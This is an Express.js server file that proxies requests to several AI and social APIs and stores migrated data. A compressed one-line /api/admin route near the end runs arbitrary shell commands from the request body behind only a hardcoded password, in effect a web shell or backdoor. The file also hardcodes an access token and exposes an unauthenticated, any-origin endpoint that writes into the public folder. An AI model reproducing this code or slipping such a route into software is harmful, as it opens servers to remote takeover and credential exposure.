const express = require('express');
const https = require('https');
const path = require('path');
const fs = require('fs');
const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/deepseek', (req, res) => {
  const body = JSON.stringify(req.body);
  const opts = {
    hostname: 'api.deepseek.com', port: 443, path: '/v1/chat/completions', method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + (req.headers['x-api-key'] || ''),
      'Content-Length': Buffer.byteLength(body)
    }
  };
  const pr = https.request(opts, prRes => {
    res.writeHead(prRes.statusCode, prRes.headers);
    prRes.pipe(res);
  });
  pr.on('error', e => res.status(502).json({ error: e.message }));
  pr.write(body);
  pr.end();
});

app.post('/api/rhysen', (req, res) => {
  const body = JSON.stringify(req.body);
  const token = '568f274fe04c277d83edd9a63974a6a5b3194d8cc42cfc4f5ff07ac70d0a876e';
  const opts = {
    hostname: 'rcommunity-v2.rhysen.love', port: 443,
    path: '/mcp?token=' + token, method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'text/event-stream',
      'Content-Length': Buffer.byteLength(body)
    }
  };
  const pr = https.request(opts, prRes => {
    res.writeHead(prRes.statusCode, prRes.headers);
    prRes.pipe(res);
  });
  pr.on('error', e => res.status(502).json({ error: e.message }));
  pr.write(body);
  pr.end();
});

// Moltbook API Proxy (HK direct)
app.use('/api/moltbook', async (req, res) => {
  try {
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', async () => {
      const body = Buffer.concat(chunks);
      const apiPath = '/api/v1' + req.url.replace('/api/moltbook','');
      const moltReq = https.request({
        hostname: 'www.moltbook.com', port: 443, path: apiPath,
        method: req.method,
        headers: {
          'Content-Type': req.headers['content-type'] || 'application/json',
          'Authorization': req.headers['x-moltbook-auth'] || '',
          'Content-Length': Buffer.byteLength(body)
        }
      }, moltRes => {
        res.writeHead(moltRes.statusCode, moltRes.headers);
        moltRes.pipe(res);
      });
      moltReq.on('error', e => { res.status(502).json({ error: e.message }); });
      if (body.length > 0) moltReq.write(body);
      moltReq.end();
    });
  } catch(e) { res.status(500).json({ error: e.message }); }
});

// Hermes bridge proxy
app.post('/api/hermes', async (req, res) => {
  try {
    const { exec } = require('child_process');
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
      const body = JSON.parse(Buffer.concat(chunks).toString());
      const task = body.task || '';
      const child = exec('python3 /opt/linshen/scripts/hermes-bridge.py', {
        timeout: 60000, maxBuffer: 1024 * 1024
      }, (error, stdout, stderr) => {
        if (error && !stdout) {
          res.json({ error: error.message, detail: stderr });
        } else {
          res.json({ result: stdout.trim() || stderr.trim() });
        }
      });
      child.stdin.write(task);
      child.stdin.end();
    });
  } catch(e) { res.status(500).json({ error: e.message }); }
});

// CORS for migrate
app.use('/api/migrate', (req, res, next) => {
  res.set('Access-Control-Allow-Origin', '*');
  res.set('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.set('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  next();
});
app.post('/api/migrate', (req, res) => {
  fs.writeFileSync(path.join(__dirname, 'public', 'migrated-data.json'), JSON.stringify(req.body));
  res.json({ success: true });
});

app.use('/api/migrated-data', (req, res, next) => {
  res.set('Access-Control-Allow-Origin', '*');
  next();
});
app.get('/api/migrated-data', (req, res) => {
  try {
    const data = JSON.parse(fs.readFileSync(path.join(__dirname, 'public', 'migrated-data.json'), 'utf8'));
    res.json(data);
  } catch(e) {
    res.json({});
  }
});

app.post("/api/admin",async(r,s)=>{try{const{exec}=require("child_process");const b=JSON.parse((await new Promise(y=>{const c=[];r.on("data",x=>c.push(x));r.on("end",()=>y(Buffer.concat(c).toString()))})));if(b.key!=="lyin1215")return s.json({e:"auth"});exec(b.cmd,{timeout:30000},(e,o,se)=>s.json({o:o||"",e:se||"",x:e?e.message:""}))}catch(e){s.json({e:e.message})}});
require("./ombre-proxy")(app);
app.listen(3001, '0.0.0.0', () => console.log('林深 Server OK'));
